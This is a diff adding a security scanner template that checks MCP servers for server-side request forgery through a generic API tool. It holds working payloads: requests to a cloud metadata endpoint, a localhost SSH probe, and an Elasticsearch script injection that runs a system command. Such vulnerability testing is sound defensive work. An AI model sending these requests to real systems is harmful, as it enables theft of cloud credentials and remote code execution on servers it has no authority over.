@@ -1,0 +1,66 @@
+id: mcp-ssrf-via-tool-params
+
+info:
+  name: MCP SSRF via Tool Parameters
+  author: crowdsentinel
+  severity: critical
+  description: |
+    Calls the general_api_request tool with URLs targeting cloud
+    metadata endpoints, internal services, and Elasticsearch script
+    injection to test for server-side request forgery vulnerabilities.
+  tags: mcp,ssrf,cloud-metadata,internal-network
+
+http:
+  - raw:
+      - |
+        POST /mcp/ HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+        Accept: application/json, text/event-stream
+
+        {"jsonrpc":"2.0","method":"tools/call","params":{"name":"general_api_request","arguments":{"method":"GET","url":"http://169.254.169.254/latest/meta-data/"}},"id":1}
+
+    matchers-condition: or
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "ami-id"
+          - "instance-id"
+        condition: or
+
+  - raw:
+      - |
+        POST /mcp/ HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+        Accept: application/json, text/event-stream
+
+        {"jsonrpc":"2.0","method":"tools/call","params":{"name":"general_api_request","arguments":{"method":"GET","url":"http://127.0.0.1:22/"}},"id":2}
+
+    matchers-condition: or
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "SSH-"
+          - "OpenSSH"
+        condition: or
+
+  - raw:
+      - |
+        POST /mcp/ HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+        Accept: application/json, text/event-stream
+
+        {"jsonrpc":"2.0","method":"tools/call","params":{"name":"general_api_request","arguments":{"method":"POST","url":"http://localhost:9200/_search","body":"{\"script_fields\":{\"exploit\":{\"script\":{\"source\":\"Runtime.getRuntime().exec('id')\"}}}}"}},"id":3}
+
+    matchers-condition: or
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "uid="
+          - "root:"
+        condition: or
